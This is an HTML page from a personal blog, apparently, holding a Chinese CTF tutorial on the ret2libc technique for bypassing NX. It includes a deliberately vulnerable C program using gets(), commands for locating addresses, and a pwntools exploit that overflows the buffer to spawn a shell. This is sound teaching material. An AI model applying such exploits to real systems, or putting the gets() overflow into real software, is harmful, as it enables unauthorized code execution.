@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="author" content="Vancir" />
+  <title>ret2libc攻击技术示例-模拟执行system函数绕过NX保护</title>
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <link href="/feed/" rel="alternate" title="Vancir" type="application/atom+xml" />
+  <link rel="stylesheet" href="/media/css/style.css" />
+  <link rel="stylesheet" href="/media/css/highlight.css" />
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+  <script type="text/javascript" src="/media/js/outliner.js"></script>
+</head>
+<!--  <body> 
+-->
+<script type="text/javascript">
+  function setTimeSpan() {
+    var date = new Date();
+    timeSpan.innerText = date.format('yyyy-MM-dd hh:mm:ss');
+  }
+
+  Date.prototype.format = function (format) {
+    var o =
+      {
+        "M+": this.getMonth() + 1, //month
+        "d+": this.getDate(),    //day
+        "h+": this.getHours(),   //hour
+        "m+": this.getMinutes(), //minute
+        "s+": this.getSeconds(), //second
+        "q+": Math.floor((this.getMonth() + 3) / 3),  //quarter
+        "S": this.getMilliseconds() //millisecond
+      }
+    if (/(y+)/.test(format))
+      format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
+    for (var k in o)
+      if (new RegExp("(" + k + ")").test(format))
+        format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
+    return format;
+  }
+</script>
+
+<body onLoad="setInterval(setTimeSpan,1000);">
+  <div id="container">
+    <div id="main" role="main">
+      <header>
+        <h1>ret2libc攻击技术示例-模拟执行system函数绕过NX保护</h1>
+      </header>
+      <nav id="real_nav">
+        <span>
+          <a title="home" class="" href="/">home</a>
+        </span>
+        <span>
+          <a title="categories" class="" href="/categories/">categories</a>
+        </span>
+        <span>
+          <a title="tags" class="" href="/tags/">tags</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/repo/">repo</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/act/">act</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/books/">books</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/musics/">musics</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/movies/">movies</a>
+        </span>
+        <span>
+          <a title="links" class="" href="/friends/">friends</a>
+        </span>
+        <span>
+          <a title="about" class="" href="/about/">about</a>
+        </span>
+        <span>
+          <a title="feed" class="" href="/feed">subscribe</a>
+        </span>
+      </nav>
+      <article class="content">
+        <section class="meta">
+<span class="time">
+  <time datetime="2017-08-03">2017-08-03</time>
+</span>
+
+ | 
+<span class="categories">
+  categories
+  
+  <a href="/categories/#tutorials" title="tutorials">tutorials</a>&nbsp;
+  
+</span>
+
+
+ | 
+<span class="tags">
+  tags
+  
+  <a href="/tags/#CTF" title="CTF">CTF</a>&nbsp;
+  
+  <a href="/tags/#pwn" title="pwn">pwn</a>&nbsp;
+  
+  <a href="/tags/#rop" title="rop">rop</a>&nbsp;
+  
+</span>
+
+</section>
+<section class="post">
+<h2 id="什么是ret2libc">什么是ret2libc？</h2>
+
+<p>ret2libc即return to libc，返回到系统函数库执行的攻击方法。</p>
+
+<p>当程序开启<code class="highlighter-rouge">NX</code>保护时，我们的shellcode无法在缓冲区中执行，但是又没有直接的可以使用的system(“/bin/sh”)代码片段。这时，我们就可以通过使用libc中的system函数，并模拟system函数的执行过程，将”/bin/sh”参数传入system函数并执行，从而获取shell</p>
+
+<h2 id="ret2libc示例代码">ret2libc示例代码</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;time.h&gt;
+</span>
+<span class="kt">char</span> <span class="o">*</span><span class="n">shell</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="p">;</span>
+<span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+
+<span class="kt">void</span> <span class="nf">secure</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">secretcode</span><span class="p">,</span> <span class="n">input</span><span class="p">;</span>
+    <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+
+    <span class="n">secretcode</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">input</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">input</span> <span class="o">==</span> <span class="n">secretcode</span><span class="p">)</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">"shell!?"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="n">buf1</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"RET2LIBC &gt;_&lt;</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">buf1</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>本节示例的漏洞程序可以从此处下载： <a href="http://od7mpc53s.bkt.clouddn.com/ret2libc1">ret2libc1</a></p>
+
+<p>使用peda自带的checksec功能检查程序开启的保护机制，这里程序只开启了<code class="highlighter-rouge">NX</code>保护</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre></div></div>
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>在调用函数比如这里我们想要执行<code class="highlighter-rouge">call system</code>这条指令，那么cpu在调用函数的过程中会完成哪些工作呢？</p>
+
+<ol>
+  <li>首先程序会将system()函数的各个参数，从右至左依次压入栈中</li>
+  <li>将<code class="highlighter-rouge">call system</code>这条指令的地址压入栈中。（当函数执行完毕，会执行<code class="highlighter-rouge">ret</code>指令将该地址弹出给EIP，这样就能在执行完<code class="highlighter-rouge">call system</code>后继续往下执行）</li>
+  <li>将system()函数的地址赋给EIP，也就是跳转到system函数开始执行</li>
+</ol>
+
+<p>那么对应的栈空间其实如下图所示</p>
+
+<p><img src="http://od7mpc53s.bkt.clouddn.com/ret2libc-system-stack-layout.png" alt="callsystem-stack-layout" /></p>
+
+<p>其中<code class="highlighter-rouge">padding1</code>是我们定位buf首地址和返回地址之间的偏移，我们用字符填充，随后的<code class="highlighter-rouge">padding2</code>其实是<code class="highlighter-rouge">system("/bin/sh")</code>执行完的返回地址，因为我们只需要得到shell，而不用管当shell停止后会如何运行，因此这里的4字节我们可以随意填充。当然如果你要写的漂亮些，也可以将其修改为<code class="highlighter-rouge">exit()</code>的地址</p>
+
+<p>那么我们就开始收集信息，这里的<code class="highlighter-rouge">padding1</code>长度我们计算后依旧是112，关于<code class="highlighter-rouge">system()</code>和<code class="highlighter-rouge">/bin/sh</code>我们也可以通过如下命令得到</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ret2libc1 ROPgadget <span class="nt">--binary</span> ret2libc1 <span class="nt">--string</span> <span class="s1">'/bin/sh'</span>
+Strings information
+<span class="o">============================================================</span>
+0x08048720 : /bin/sh
+➜  ret2libc1 objdump <span class="nt">-dj</span> .plt ret2libc1 | <span class="nb">grep</span> <span class="s1">'system'</span>
+08048460 &lt;system@plt&gt;:
+</code></pre></div></div>
+<p>值得注意的是，这里是<code class="highlighter-rouge">system@plt</code>，跟我们所知的system函数还是有所区别的，这相关于linux的延迟绑定，我们暂不作深究。</p>
+
+<h2 id="攻击代码">攻击代码</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x08048720</span>
+<span class="n">plt_system</span> <span class="o">=</span> <span class="mh">0x08048460</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">112</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_system</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'ret2libc1'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+</section>
+<section align="right">
+<br/>
+<span>
+	<a  href="/2017/08/03/ret2libc%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B-%E4%BB%85%E6%9C%89system()%E6%83%85%E5%86%B5%E4%B8%8B%E8%BE%93%E5%85%A5binsh%E5%AE%8C%E6%88%90%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/" class="pageNav"  >Previous</a>
+	&nbsp;&nbsp;&nbsp;
+	<a  href="/2017/08/03/ret2libc%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B-%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9C%B0%E5%9D%80%E8%AE%A1%E7%AE%97system()%E5%9C%B0%E5%9D%80%E7%BB%95%E8%BF%87ASLR/" class="pageNav"  >Next</a>
+</span>
+</section>
+
+<script type="text/javascript">
+$(function(){
+  $(document).keydown(function(e) {
+    var url = false;
+        if (e.which == 37 || e.which == 74) {  // Left arrow and J
+            
+        url = 'http://localhost:4000/2017/08/03/ret2libc%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B-%E4%BB%85%E6%9C%89system()%E6%83%85%E5%86%B5%E4%B8%8B%E8%BE%93%E5%85%A5binsh%E5%AE%8C%E6%88%90%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/';
+        
+        }
+        else if (e.which == 39 || e.which == 75) {  // Right arrow and K
+            
+        url = 'http://localhost:4000/2017/08/03/ret2libc%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B-%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9C%B0%E5%9D%80%E8%AE%A1%E7%AE%97system()%E5%9C%B0%E5%9D%80%E7%BB%95%E8%BF%87ASLR/';
+        
+        }
+        if (url) {
+            window.location = url;
+        }
+  });
+})
+</script>
+
+      </article>
+      <a style="position:fixed;bottom:5px;right:5px;" href="#" title="Back to Top">
+        <img src="/assets/btt.png" />
+      </a>
+    </div>
+    <footer>
+      <p>
+        <small>
+          Powered by
+          <a href="http://jekyllrb.com" target="_blank">Jekyll</a> @
+          <a href="https://github.com/Vancir/vancir.github.io" target="_blank" title="project homepage">github</a> | Copyright 2017 - 2018 by
+          <a href="/about/">Vancir</a> |
+          <span class="label label-info" id="timeSpan"></span>
+        </small>
+      </p>
+    </footer>
+  </div>
+</body>
+
+</html>
